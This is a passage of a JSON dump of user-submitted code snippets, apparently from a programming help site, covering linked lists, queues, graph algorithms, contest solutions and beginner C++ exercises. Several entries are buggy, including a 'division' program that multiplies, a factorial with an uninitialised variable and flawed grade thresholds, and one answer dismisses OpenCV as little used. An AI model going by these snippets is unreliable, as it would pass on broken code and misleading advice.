printList();     while(!isEmpty()) {                   struct node *temp = deleteFirst();       printf(\"\\nDeleted value:\");         printf(\"(%d,%d) \",temp->key,temp->data);    }    \t    printf(\"\\nList after deleting all items: \");    printList();    }\n#include <iostream> using namespace std;  #define  NULL  0   struct  node {   int  data ;   struct  node  *next ; } ;  struct  node  *first=NULL ; struct  node  *last=NULL ;  void  create() {   int  i , n ;   struct  node  *pnode , *p ;    printf(\"Enter the number of nodes required:\\n\") ;   scanf(\"%d\",&n) ;    printf(\"Enter the data value of each node:\\n\") ;   for(i=1 ; i<=n ; i++)   {     pnode=(struct node*)malloc(sizeof(struct node)) ;     if(pnode==NULL)     {       printf(\"Memory overflow. Unable to create.\\n\") ;       return ;     }      scanf(\"%d\",&pnode->data) ;      if(first==NULL) \t first=last=pnode ;     else     { \t  last->next=pnode ; \t  last=pnode ;    /* last keeps track of last node */     }      last->next=first ;   } }  /* This function will delete a node with value k from the Linked List if such a node exists */ void  deletenode(int  k) {   struct  node  *p , *follow ;    /* searching the required node */   p=first ;   follow=NULL ;   while(follow!=last)   {     if(p->data==k) \t  break ;     follow=p ;     p=p->next ;   }    if(follow==last)     printf(\"Required node not found.\\n\") ;   else   {     if(p==first&&p==last)  /* deleting the one and the only node */ \t  first=last=NULL ;     else if(p==first)       /* deleting the first node */     {       first=first->next ;       last->next=first ;     }     else if(p==last)      /* deleting the last node */     {       last=follow ;       last->next=first ;     }     else\t\t/* deleting any other node */       follow->next=p->next ;      free(p) ;   } }  /* This function will go through all the nodes of Linked List exactly once and will display data value of each node */ void  traverse() {   struct  node  *p , *follow ;   if(first==NULL)     printf(\"Circularly Linked List Empty\") ;   else   {     printf(\"Circularly Linked List is as shown: \\n\") ;      p=first ;     follow = NULL ;     while(follow!=last)     {       printf(\"%d \" , p->data) ;       follow=p ;       p=p->next ;     }      printf(\"\\n\") ;   } }  int main() {   int  x , k , ch ;     do   {     printf(\"\\n Menu: \\n\") ;     printf(\"1:Create Linked List \\n\") ;     printf(\"2:Delete Node \\n\") ;     printf(\"3:Traverse \\n\") ;     printf(\"4:Exit \\n\") ;      printf(\"\\nEnter your choice: \") ;     scanf(\"%d\",&ch) ;      switch(ch)     {       case 1:       create() ;       break ;        case 2:       printf(\"Enter the data value of the node to be deleted: \") ;       scanf(\"%d\",&k) ;       deletenode(k) ;       break ;        case 3:       traverse() ;       break ;        case 4:       break ;     }  }  while(ch!=4) ;   return 0; } \n#include<iostream>  #define SIZE 100  using namespace std;  class node { public:     node()     {         next = NULL;     }   int data;   node *next; }*front=NULL,*rear=NULL,*n,*temp,*temp1;  class cqueue { public:     void insertion();     void deletion();     void display(); };  int main() {     cqueue cqobj;   int ch;   do   {      cout<<\"\\n\\n\\tMain Menu\";      cout<<\"\\n##########################\";      cout<<\"\\n1. Insert\\n2. Delete\\n3. Display\\n4. Exit\\n\\nEnter Your Choice: \";      cin>>ch;      switch(ch)      {         case 1:           cqobj.insertion();           cqobj.display();           break;         case 2:           cqobj.deletion();           break;         case 3:           cqobj.display();           break;         case 4:           break;         default:           cout<<\"\\n\\nWrong Choice!!! Try Again.\";      }   }while(ch!=4);   return 0; }  void cqueue::insertion() {   n=new node[sizeof(node)];   cout<<\"\\nEnter the Element: \";   cin>>n->data;   if(front==NULL)   {       front=n;   }   else   {       rear->next=n;   }   rear=n;   rear->next=front; }  void cqueue::deletion() {   int x;   temp=front;   if(front==NULL)   {       cout<<\"\\nCircular Queue Empty!!!\";   }   else   {      if(front==rear)      {        x=front->data;        delete(temp);        front=NULL;        rear=NULL;      }      else      {         x=temp->data;         front=front->next;         rear->next=front;         delete(temp);      }      cout<<\"\\nElement \"<<x<<\" is Deleted\";      display();   } }  void cqueue::display() {   temp=front;   temp1=NULL;   if(front==NULL)   {     cout<<\"\\n\\nCircular Queue Empty!!!\";   }   else   {     cout<<\"\\n\\nCircular Queue Elements are:\\n\\n\";     while(temp!=temp1)     {        cout<<temp->data<<\"  \";        temp=temp->next;        temp1=front;     }   } }\n/* Function to traverse a given Circular linked list and print nodes */ void printList(struct Node *first)  {      struct Node *temp = first;          // If linked list is not empty      if (first != NULL)       {          // Keep printing nodes till we reach the first node again          do         {              printf(\"%d \", temp->data);              temp = temp->next;          }          while (temp != first);      }  } \n",
    "reg_date": "2021-10-12T11:36:43.000Z"
  },
  {
    "id": 177,
    "keyword": null,
    "link": null,
    "title": " Cod Cold War no recoil",
    "description": "Cod Cold War norecoil \n",
    "reg_date": "2021-10-12T11:36:43.000Z"
  },
  {
    "id": 178,
    "keyword": null,
    "link": null,
    "title": " Codeforces Global Round 14 D",
    "description": "#include <bits/stdc++.h> using namespace std;  int N,L,R; int C[200001]; int lcnt[200001],rcnt[200001];  void solve(){   cin>>N>>L>>R;   for (int i=1;i<=N;i++){     lcnt[i]=0;     rcnt[i]=0;   }   for (int i=1;i<=N;i++){     cin>>C[i];     if (i<=L)       lcnt[C[i]]++;     else       rcnt[C[i]]++;   }   //remove pairs that are already matching   for (int i=1;i<=N;i++){     int mn=min(lcnt[i],rcnt[i]);     lcnt[i]-=mn;     rcnt[i]-=mn;     L-=mn;     R-=mn;   }   if (L<R){     swap(lcnt,rcnt);     swap(L,R);   }   //now, there are at least as many left socks as right socks   int ans=0;   for (int i=1;i<=N;i++){     int extra=L-R; //always even     int canDo=lcnt[i]/2;     int Do=min(canDo*2,extra);     //turn \"Do\"/2 left socks of color i into right socks     ans+=Do/2;     L-=Do;   }   //turn extra lefts into rights, then adjust all colors   ans+=(L-R)/2+(L+R)/2;   cout<<ans<<endl; } int main() {   ios_base::sync_with_stdio(0);cin.tie(0);   int T; cin>>T;   while (T--)     solve();   return 0; } \n",
    "reg_date": "2021-10-12T11:36:43.000Z"
  },
  {
    "id": 179,
    "keyword": null,
    "link": null,
    "title": " Come concatenare stringhe in c++",
    "description": "char str1[] = \"This \"; char str2[] = \"is a string\"; strcat (str1, str2);  cout << str1 << endl; \n",
    "reg_date": "2021-10-12T11:36:43.000Z"
  },
  {
    "id": 180,
    "keyword": null,
    "link": null,
    "title": " Computer vision libraries C++",
    "description": "Don't Use Open CV .It's hard and it's not being used as widely.  I suggest you to learn computer vision with deep learning libraries like pytorch,keras,etc. \n",
    "reg_date": "2021-10-12T11:36:43.000Z"
  },
  {
    "id": 181,
    "keyword": null,
    "link": null,
    "title": " Consell de forces polítiques de Catalunya",
    "description": "Helo World\n",
    "reg_date": "2021-10-12T11:36:43.000Z"
  },
  {
    "id": 182,
    "keyword": null,
    "link": null,
    "title": " Construct the string codeforces solution",
    "description": " 1 #include <iostream>  2 #include <cstdio>  3 #include <cstring>  4 using namespace std;  5 #define scanf scanf_s  6   7 int T;  8 int n, a, b;  9 int main() { 10     scanf(\"%d\", &T); 11     while (T--) { 12         scanf(\"%d%d%d\", &n, &a, &b); 13         char s[10001]; 14         for (int i = 0; i < n; i++) { 15             s[i] = 'a' + i % b; 16         } 17         s[n] = '\\0'; 18         printf(\"%s\\n\", s); 19     } 20  21     return 0; 22 }\n",
    "reg_date": "2021-10-12T11:36:43.000Z"
  },
  {
    "id": 183,
    "keyword": null,
    "link": null,
    "title": " Convert a hexadecimal number into decimal c++",
    "description": "#include <iostream> #include <iomanip> using namespace std; int main() {     int x;     cin >>hex >> x;     cout << x << endl;     return 0; } \n",
    "reg_date": "2021-10-12T11:36:43.000Z"
  },
  {
    "id": 184,
    "keyword": null,
    "link": null,
    "title": " Converting to string c++",
    "description": "// to_string example #include <iostream>   // std::cout #include <string>     // std::string, std::to_string  int main () {   std::string pi = \"pi is \" + std::to_string(3.1415926);   std::string perfect = std::to_string(1+2+4+7+14) + \" is a perfect number\";   std::cout << pi << '\\n';   std::cout << perfect << '\\n';   return 0; }\nstd::to_string(23213.123)\n- Writing your own conversion function, the simple: template<class T> string toString(const T& x) { \tostringstream ss; \tss << x; \treturn ss.str(); } - Since C++11 you can also use the std::to_string:  string s = to_string(0x12f3); // after this the string s contains \"4851\"\nint i=11; string str= to_string(i);\n#include <iostream>   #include <boost/lexical_cast.hpp>   using namespace std;   int main()   {    int i=11;    string str = boost::lexical_cast<string>(i);   cout<<\"string value of integer i is :\"<<str<<\"\\n\";      }  \n",
    "reg_date": "2021-10-12T11:36:43.000Z"
  },
  {
    "id": 185,
    "keyword": null,
    "link": null,
    "title": " Count set bits in an integer c++",
    "description": "//Method 1 \tint count = __builtin_popcount(number); //Method 2 \tint count = 0;     while (number) {         count += number & 1;         n >>= 1;     }\ncountBits = (n) => n.toString(2).split(\"0\").join(\"\").length;\n//Method 1    int count = 0;    while (n)    {         count++;         n >>= 1;     } //Method 2 \tint count = (int)log2(number)+1;\n",
    "reg_date": "2021-10-12T11:36:44.000Z"
  },
  {
    "id": 186,
    "keyword": null,
    "link": null,
    "title": " Création de la classe en c++",
    "description": "class Personnage {     // M&eacute;thodes     void recevoirDegats(int nbDegats)     {       }       void attaquer(Personnage &cible)     {       }       void boirePotionDeVie(int quantitePotion)     {       }       void changerArme(string nomNouvelleArme, int degatsNouvelleArme)     {       }       bool estVivant()     {       }       // Attributs     int m_vie;     int m_mana;     string m_nomArme;     int m_degatsArme; }; \n",
    "reg_date": "2021-10-12T11:36:44.000Z"
  },
  {
    "id": 187,
    "keyword": null,
    "link": null,
    "title": " Create a program that finds the minimum value in these numbers",
    "description": "Create a program that finds the minimum value in these numbers:\n",
    "reg_date": "2021-10-12T11:36:44.000Z"
  },
  {
    "id": 188,
    "keyword": null,
    "link": null,
    "title": " Creating segment for sqrt decomposition",
    "description": "int segment[10000]; int preprocess(int input[], int n) {      int current_segment = -1;      int segment_size = sqrt(n);          for (int i=0; i<n; i++) {          if (i % segment_size == 0) {              current_segment++;  //new segment         }          segment[current_segment] += input[i];      }           return segment_size; } \n",
    "reg_date": "2021-10-12T11:36:44.000Z"
  },
  {
    "id": 189,
    "keyword": null,
    "link": null,
    "title": " DFS in c++",
    "description": "############### #The Algorithm (In English):  # 1) Pick any node.  # 2) If it is unvisited, mark it as visited and recur on all its  #    adjacent nodes.  # 3) Repeat until all the nodes are visited, or the node to be  #    searched is found.   # The graph below (declared as a Python dictionary) # is from the linked website and is used for the sake of # testing the algorithm. Obviously, you will have your own # graph to iterate through. graph = {     'A' : ['B','C'],     'B' : ['D', 'E'],     'C' : ['F'],     'D' : [],     'E' : ['F'],     'F' : [] }  visited = set() # Set to keep track of visited nodes.   ################## # The Algorithm (In Code)  def dfs(visited, graph, node):     if node not in visited:         print (node)         visited.add(node)         for neighbour in graph[node]:             dfs(visited, graph, neighbour)              # Driver Code to test in python yourself. # Note that when calling this, you need to # call the starting node. In this case it is 'A'. dfs(visited, graph, 'A')  # NOTE: There are a few ways to do DFS, depending on what your # variables are and/or what you want returned. This specific # example is the most fleshed-out, yet still understandable, # explanation I could find.\n#include <bits/stdc++.h> using namespace std;    class Graph {     int V;          list<int>* adj;          void DFSUtil(int v, bool visited[]);   public:     Graph(int V);       void addEdge(int v, int w);          void DFS(int v); };   Graph::Graph(int V) {     this->V = V;     adj = new list<int>[V]; }   void Graph::addEdge(int v, int w) {     adj[v].push_back(w);  }   void Graph::DFSUtil(int v, bool visited[]) {         visited[v] = true;     cout << v << \" \";           list<int>::iterator i;     for (i = adj[v].begin(); i != adj[v].end(); ++i)         if (!visited[*i])             DFSUtil(*i, visited); }    void Graph::DFS(int v) {         bool* visited = new bool[V];     for (int i = 0; i < V; i++)         visited[i] = false;         DFSUtil(v, visited); }    int main() {        Graph g(4);     g.addEdge(0, 1);     g.addEdge(0, 2);     g.addEdge(1, 2);     g.addEdge(2, 0);     g.addEdge(2, 3);     g.addEdge(3, 3);       cout << \"Following is Depth First Traversal\"             \" (starting from vertex 2) \\n\";     g.DFS(2);       return 0; }\n",
    "reg_date": "2021-10-12T11:36:44.000Z"
  },
  {
    "id": 190,
    "keyword": null,
    "link": null,
    "title": " Dangling Pointer",
    "description": "int *p = new int; // request memory *p = 5; // store value  delete p; // free up the memory // now p is a dangling pointer  p = new int; // reuse for a new address\n",
    "reg_date": "2021-10-12T11:36:44.000Z"
  },
  {
    "id": 191,
    "keyword": null,
    "link": null,
    "title": " Dangling Pointer in cpp",
    "description": "int *p = new int; // request memory *p = 5; // store value  delete p; // free up the memory // now p is a dangling pointer  p = new int; // reuse for a new address\n",
    "reg_date": "2021-10-12T11:36:44.000Z"
  },
  {
    "id": 192,
    "keyword": null,
    "link": null,
    "title": " December global holidays",
    "description": "its almost over...\nMaybe 2020 was kinda weird, but I hope everyone reading this has a wonderful December. Happy Holidays!!! :D\nint dayOfChristmas = 1;          if(dayOfChristmas == 1)         {         Console.WriteLine(\"On the first day of Christmas my true love sent to me: A Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 2)         {         Console.WriteLine(\"On the second day of Christmas my true love sent to me: 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 3)         {         Console.WriteLine(\"On the third day of Christmas my true love sent to me: 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 4)         {         Console.WriteLine(\"On the fourth day of Christmas my true love sent to me:4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 5)         {         Console.WriteLine(\"On the fifth day of Christmas my true love sent to me: 5 Golden Rings 4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 6)         {         Console.WriteLine(\"On the sixth day of Christmasmy true love sent to me: 6 Geese a Laying 5 Golden Rings 4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 7)         {         Console.WriteLine(\"On the seventh day of Christmas my true love sent to me: 7 Swans a Swimming 6 Geese a Laying 5 Golden Rings 4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 8)         {         Console.WriteLine(\"On the eighth day of Christmas my true love sent to me: 8 Maids a Milking 7 Swans a Swimming 6 Geese a Laying 5 Golden Rings 4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 9)         {         Console.WriteLine(\"On the ninth day of Christmas my true love sent to me: 9 Ladies Dancing 8 Maids a Milking 7 Swans a Swimming 6 Geese a Laying 5 Golden Rings 4 Calling Bird 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 10)         {         Console.WriteLine(\"On the tenth day of Christmas my true love sent to me: 10 Lords a Leaping 9 Ladies Dancing 8 Maids a Milking 7 Swans a Swimming 6 Geese a Laying 5 Golden Rings 4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 11)         {         Console.WriteLine(\"On the eleventh day of Christmas my true love sent to me: 11 Pipers Piping 10 Lords a Leaping 9 Ladies Dancing 8 Maids a Milking 7 Swans a Swimming 6 Geese a Laying 5 Golden Rings 4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 12)         {         Console.WriteLine(\"On the twelfth day of Christmas my true love sent to me 12 Drummers Drumming 11 Pipers Piping 10 Lords a Leaping 9 Ladies Dancing 8 Maids a Milking 7 Swans a Swimming 6 Geese a Laying 5 Golden Rings 4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }                                  Console.WriteLine(\"Happy Holidays\");\nif December 25  \tPrint('Christmas')\nHappy Holidays Everyone! \nprint('Happy Holidays God Bless!!')\nMerry Christmas everyone. 2020 was weird but lets all hope that 2021 is better.\nHAPPY HOLIDAYS\nHappy Festivus!\nHappy Holidays!!!\n",
    "reg_date": "2021-10-12T11:36:44.000Z"
  },
  {
    "id": 193,
    "keyword": null,
    "link": null,
    "title": " Define and show the implementation of the functions of an arrayList.",
    "description": "// Assign to list variable directly with STREAM FILTER METHID ArrayList<String> filteredColors = (ArrayList<String>) colors.stream().filter(x -> x.contains(\"o\")).collect(Collectors.toList());  // Clone and remove unwanted(TRADITIONAL FILTERING) filteredColors = (ArrayList<String>) colors.clone(); filteredColors.removeIf(x -> !x.contains(\"o\"));  // Find specific element colors.stream().filter(x -> x.contains(\"ora\")).findFirst().get();\nArrayList<String> alist=new ArrayList<String>();\n",
    "reg_date": "2021-10-12T11:36:44.000Z"
  },
  {
    "id": 194,
    "keyword": null,
    "link": null,
    "title": " Dijkstra's Weighted Graph Shortest Path in c++",
    "description": "#include <limits.h>  #include <stdio.h>      #define V 9      int minDistance(int dist[], bool sptSet[])  {       int min = INT_MAX, min_index;         for (int v = 0; v < V; v++)          if (sptSet[v] == false && dist[v] <= min)              min = dist[v], min_index = v;         return min_index;  }      void printSolution(int dist[])  {      printf(\"Vertex \\t\\t Distance from Source\\n\");      for (int i = 0; i < V; i++)          printf(\"%d \\t\\t %d\\n\", i, dist[i]);  }      void dijkstra(int graph[V][V], int src)  {      int dist[V];              bool sptSet[V];       for (int i = 0; i < V; i++)          dist[i] = INT_MAX, sptSet[i] = false;            dist[src] = 0;            for (int count = 0; count < V - 1; count++) {                  int u = minDistance(dist, sptSet);                     sptSet[u] = true;                     for (int v = 0; v < V; v++)                             if (!sptSet[v] && graph[u][v] && dist[u] != INT_MAX                  && dist[u] + graph[u][v] < dist[v])                  dist[v] = dist[u] + graph[u][v];      }           printSolution(dist);  }      int main()  {           int graph[V][V] = { { 0, 4, 0, 0, 0, 0, 0, 8, 0 },                          { 4, 0, 8, 0, 0, 0, 0, 11, 0 },                          { 0, 8, 0, 7, 0, 4, 0, 0, 2 },                          { 0, 0, 7, 0, 9, 14, 0, 0, 0 },                          { 0, 0, 0, 9, 0, 10, 0, 0, 0 },                          { 0, 0, 4, 14, 10, 0, 2, 0, 0 },                          { 0, 0, 0, 0, 0, 2, 0, 1, 6 },                          { 8, 11, 0, 0, 0, 0, 1, 0, 7 },                          { 0, 0, 2, 0, 0, 0, 6, 7, 0 } };         dijkstra(graph, 0);         return 0;  } \n",
    "reg_date": "2021-10-12T11:36:45.000Z"
  },
  {
    "id": 195,
    "keyword": null,
    "link": null,
    "title": " Display a Text",
    "description": "#include <iostream> using namespace std;  // declaring a function void greet() {     cout << \"Hello there!\"; }  int main() {      // calling the function     greet();      return 0; }\n",
    "reg_date": "2021-10-12T11:36:45.000Z"
  },
  {
    "id": 196,
    "keyword": null,
    "link": null,
    "title": " Display dot product of two Arrays.",
    "description": "Display dot product of two Arrays.   \n",
    "reg_date": "2021-10-12T11:36:45.000Z"
  },
  {
    "id": 197,
    "keyword": null,
    "link": null,
    "title": " Dynamically allocate a string object and save the address in the pointer variable p.",
    "description": "#include <iostream>  int main() { string* p; int n;  p = new string; // Dynamically allocate a string object and save the address in the pointer variable p.  }\n",
    "reg_date": "2021-10-12T11:36:45.000Z"
  },
  {
    "id": 198,
    "keyword": null,
    "link": null,
    "title": " ESP-NOW Sender sketch",
    "description": "//=================================================================================================// // MASTER                                                                                          // // Controlling LEDs with Two ESP8266 Uses ESP-NOW Protocol                                         // // Edited and Adapted by: Engineer Jemerson Marques, On: 22.12.2019 - FVM Learning website         // // Available at: https://www.fvml.com.br and on Youtube channel                                    // // https://www.youtube.com/c/FVMLearning - I hope you have fun - Good luck                         // //-------------------------------------------------------------------------------------------------//  #include <ESP8266WiFi.h> extern \"C\" { #include <espnow.h> } // This is the slave MAC Address which receives the data  uint8_t mac[] = {0x5C, 0xCF, 0x7F, 0x4C, 0x82, 0x5C}; //AP MAC SLAVE'S ADDRESS    #define WIFI_CHANNEL 4   int prevstate_1 = LOW;   int prevstate_2 = LOW;  // Data structure, must be the same for the slave  struct __attribute__((packed))DataStruct {   char text[32]; };     DataStruct button_1;     DataStruct button_2;  //===================================================================================================== void setup() {   pinMode(D1, INPUT_PULLUP);   pinMode(D4, INPUT_PULLUP);   pinMode(D2, OUTPUT);   pinMode(D3, OUTPUT);    Serial.begin(115200); Serial.println();   Serial.println(\"Starting EspnowController.ino\");   WiFi.mode(WIFI_STA); // Station mode for esp-now controller   WiFi.disconnect();   Serial.printf(\"This mac: %s, \", WiFi.macAddress().c_str());   Serial.printf(\"slave mac: \u0002x\u0002x\u0002x\u0002x\u0002x\u0002x\", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);   Serial.printf(\", channel: %i\\n\", WIFI_CHANNEL);   if (esp_now_init() != 0)   {     Serial.println(\"*** ESP_Now initialization failed\");   }   esp_now_set_self_role(ESP_NOW_ROLE_CONTROLLER);   esp_now_add_peer(mac, ESP_NOW_ROLE_SLAVE, WIFI_CHANNEL, NULL, 0);   strcpy(button_1.text, \"Button 01 pressed\");   strcpy(button_2.text, \"Button 02 pressed\");   Serial.println(\"Setup finished\"); }  //======================================================================================================  void loop() {   sendData(); }  //====================================================================================================== void sendData() {    int currentstate_1 = digitalRead(D4);   if (prevstate_1 != currentstate_1) {     if (currentstate_1 == LOW) {       uint8_t bs[sizeof(button_1)];       memcpy(bs, &button_1, sizeof(button_1));       esp_now_send(mac, bs, sizeof(button_1));       Serial.println(button_1.text);       digitalWrite(D2, !digitalRead(D2));     }   } prevstate_1 = currentstate_1;    int currentstate_2 = digitalRead(D1);   if (prevstate_2 != currentstate_2) {     if (currentstate_2 == LOW) {       uint8_t bs[sizeof(button_2)];       memcpy(bs, &button_2, sizeof(button_2));       esp_now_send(mac, bs, sizeof(button_2));       Serial.println(button_2.text);       digitalWrite(D3, !digitalRead(D3));     }   } prevstate_2 = currentstate_2; }  //========================================== www.fvml.com.br ===========================================  \n",
    "reg_date": "2021-10-12T11:36:45.000Z"
  },
  {
    "id": 199,
    "keyword": null,
    "link": null,
    "title": " Empty the vector",
    "description": "//C++ STL program to demonstrate example of //vector::empty() function  #include <iostream> #include <vector> using namespace std;  int main() {     vector<int> v1;      //printing the size of the vector     cout << \"Total number of elements: \" << v1.size() << endl;     //checking whether vector is empty or not     if (v1.empty())         cout << \"vector is empty.\" << endl;     else         cout << \"vector is not empty.\" << endl;      //pushing elements     v1.push_back(10);     v1.push_back(20);     v1.push_back(30);     v1.push_back(40);     v1.push_back(50);      //printing the size of the vector     cout << \"Total number of elements: \" << v1.size() << endl;     //checking whether vector is empty or not     if (v1.empty())         cout << \"vector is empty.\" << endl;     else         cout << \"vector is not empty.\" << endl;      return 0; } \nreturn vector<int>(); //or return{};\n",
    "reg_date": "2021-10-12T11:36:45.000Z"
  },
  {
    "id": 200,
    "keyword": null,
    "link": null,
    "title": " Enter a key and display it's ascii value in c++",
    "description": "#include<iostream> using namespace std; int main () {     char c;     cout << \"Enter a character : \";     cin >> c;     cout << \"ASCII value of \" << c <<\" is :  \" << (int)c;     return 0; }\n#include<iostream.h> #include<conio.h> void main() {   char a;   clrscr();   cout<<\"\\nEnter any key: \";   cin>>a;   cout<<\"ASCII value of \"<<a<<\" is: \"<<int(a);   getch(); }\n",
    "reg_date": "2021-10-12T11:36:45.000Z"
  },
  {
    "id": 201,
    "keyword": null,
    "link": null,
    "title": " Euler constant",
    "description": "#include <cmath> const double EulerConstant = std::exp(1.0); \n",
    "reg_date": "2021-10-12T11:36:45.000Z"
  },
  {
    "id": 202,
    "keyword": null,
    "link": null,
    "title": " Explain operator overloading with an example.",
    "description": "In C++, we can change the way operators work for user-defined types like objects and structures. This is known as operator overloading. For example,  Suppose we have created three objects c1, c2 and result from a class named Complex that represents complex numbers.  Since operator overloading allows us to change how operators work, we can redefine how the + operator works and use it to add the complex numbers of c1 and c2 by writing the following code:  result = c1 + c2; instead of something like  result = c1.addNumbers(c2); This makes our code intuitive and easy to understand.  Note: We cannot use operator overloading for fundamental data types like int, float, char and so on.  Syntax for C++ Operator Overloading To overload an operator, we use a special operator function.  class className {     ... .. ...     public        returnType operator symbol (arguments) {            ... .. ...        }      ... .. ... };\n",
    "reg_date": "2021-10-12T11:36:46.000Z"
  },
  {
    "id": 203,
    "keyword": null,
    "link": null,
    "title": " F && T || !(T) && F",
    "description": "F && T || !(T) && F \n",
    "reg_date": "2021-10-12T11:36:46.000Z"
  },
  {
    "id": 204,
    "keyword": null,
    "link": null,
    "title": " Factorial of a number Using Recursion",
    "description": "# Factorial of a number using recursion  def recur_factorial(n):    if n == 1:        return n    else:        return n*recur_factorial(n-1)  num = 7  # check if the number is negative if num < 0:    print(\"Sorry, factorial does not exist for negative numbers\") elif num == 0:    print(\"The factorial of 0 is 1\") else:    print(\"The factorial of\", num, \"is\", recur_factorial(num)) \n//using recursion to find factorial of a number  #include<stdio.h>  int fact(int n);  int main() {     int n;     printf(\"Enter the number: \");     scanf(\"%d\",&n);      printf(\"Factorial of %d = %d\", n, fact(n));  }  int fact(int n)  {     if (n>=1)         return n*fact(n-1);     else         return 1; }\nFUNCTION FACTORIAL (N: INTEGER): INTEGER (* RECURSIVE COMPUTATION OF N FACTORIAL *)  BEGIN   (* TEST FOR STOPPING STATE *)   IF N <= 0 THEN     FACTORIAL := 1   ELSE     FACTORIAL := N * FACTORIAL(N - 1) END; (* FACTORIAL *) \n#include <stdio.h> int factorial(int number){     if(number==1){         return number;     }     return number*factorial(number - 1); } int main(){     int a=factorial(5);     printf(\"%d\",a); } \n// Factorial of n = 1*2*3*...*n  #include <iostream> using namespace std;  int factorial(int);  int main() {     int n, result;      cout << \"Enter a non-negative number: \";     cin >> n;      result = factorial(n);     cout << \"Factorial of \" << n << \" = \" << result;     return 0; }  int factorial(int n) {     if (n > 1) {         return n * factorial(n - 1);     } else {         return 1;     } }\n",
    "reg_date": "2021-10-12T11:36:46.000Z"
  },
  {
    "id": 205,
    "keyword": null,
    "link": null,
    "title": " Fill 2-dimensional array with value",
    "description": "int a[100000][100000]; std::fill((int*)a,(int*)a+sizeof(a)/sizeof(int),0); \n",
    "reg_date": "2021-10-12T11:36:46.000Z"
  },
  {
    "id": 206,
    "keyword": null,
    "link": null,
    "title": " Find Missing And Repeating",
    "description": "// { Driver Code Starts #include <bits/stdc++.h>  using namespace std;   // } Driver Code Ends class Solution{ public:     long long *findTwoElement(int *arr, int n) {         long long N=n;          long long s=(N*(N+1))/2;         long long sm=(N*(N+1)*(2*N +1))/6;              for(int i=0;i<n;i++){             s-=arr[i];             long long k=arr[i];             sm-=k*k;         }                 long long flag=sm/s;         long long mis=(flag+s)/2;         long long db=flag-mis;         long long*a=new long long (2);         a[0]=db;         a[1]=mis;     return a;     } };   // { Driver Code Starts.  int main() {     int t;     cin >> t;     while (t--) {         int n;         cin >> n;         int a[n];         for (int i = 0; i < n; i++) {             cin >> a[i];         }         Solution ob;         auto ans = ob.findTwoElement(a, n);         cout << ans[0] << \" \" << ans[1] << \"\\n\";     }     return 0; }  // } Driver Code Ends\n",
    "reg_date": "2021-10-12T11:36:46.000Z"
  },
  {
    "id": 207,
    "keyword": null,
    "link": null,
    "title": " Find N Unique Integers Sum Up to Zero",
    "description": "Input: n = 5 Output: [-7,-1,1,3,4] Explanation: These arrays also are accepted [-5,-1,1,2,3] , [-3,-1,2,-2,4]. \n",
    "reg_date": "2021-10-12T11:36:46.000Z"
  },
  {
    "id": 208,
    "keyword": null,
    "link": null,
    "title": " Find Subarray sum using c++",
    "description": "#include <iostream> using namespace std; int main() {     int arrayLen, totalSum;     int arr[20];      //input     cin >> arrayLen >> totalSum;     for (int i = 0; i < arrayLen; i++)     {         cin >> arr[i];     }          //algo     // j => Loop iterator     int i = 0, j = 0, start = -1, end = -1, sum = 0;      while (j < arrayLen && sum + arr[j] <= totalSum)      {         sum += arr[j];         j++;     } // after this loop sum is either greater than or equal to totalSum      // If sum is equal     if (sum == totalSum)     {         cout << i + 1 << \" \" << j << endl;         return 0;     }          while (j < arrayLen)     {         sum += arr[j];                  while (sum > totalSum)         {             sum -= arr[i];             i++;         }          if (sum == totalSum) //Store values         {             start = i + 1;             end = j + 1;             break;         }         j++;     }     cout << start <<\" \"<< end;      return 0; }\n",
    "reg_date": "2021-10-12T11:36:46.000Z"
  },
  {
    "id": 209,
    "keyword": null,
    "link": null,
    "title": " Find subarray sum in c++",
    "description": "",
    "reg_date": "2021-10-12T11:36:46.000Z"
  },
  {
    "id": 210,
    "keyword": null,
    "link": null,
    "title": " Find the Division of Two Numbers in C++",
    "description": "#include <iostream>#include <conio.h>using namespace std;int main (){    int first;    int second;    first=34;    second=35;    int division;    division=firstNumber*second;    cout<<\"The division of two Is \"<< division<<endl:    return 0;   }\n",
    "reg_date": "2021-10-12T11:36:47.000Z"
  },
  {
    "id": 211,
    "keyword": null,
    "link": null,
    "title": " Find the Factorial of a Number in C++",
    "description": "#include <iostream>using namespace std;void factorial (int x);int main (){    int number;     int fact =1;    for (int i=1;i<=number;i++)    {        fact=fact*i;    }    cout <<\"fact\"<<number<<\"is \"<<fact;    return 0;}\n",
    "reg_date": "2021-10-12T11:36:47.000Z"
  },
  {
    "id": 212,
    "keyword": null,
    "link": null,
    "title": " Find the Grade of a Student in C++",
    "description": "#include <iostream>using namespace std;int main (){    int marks;    cout <<\"enter your marks. \";    cin>>marks;    if (marks>=90)    cout <<\"A grade\";    else if(marks>=90)        cout<<\"B grade\";    else if(marks>=80)        cout<<\"C grade\";    else if (marks>=70)        cout<<\"D grade\";    else         cout<<\"F grade.\";    return 0;                                           }\n",
    "reg_date": "2021-10-12T11:36:47.000Z"
  },
  {
    "id": 213,
    "keyword": null,
    "link": null,
    "title": " Find the Multiplication of Two Numbers in C++",
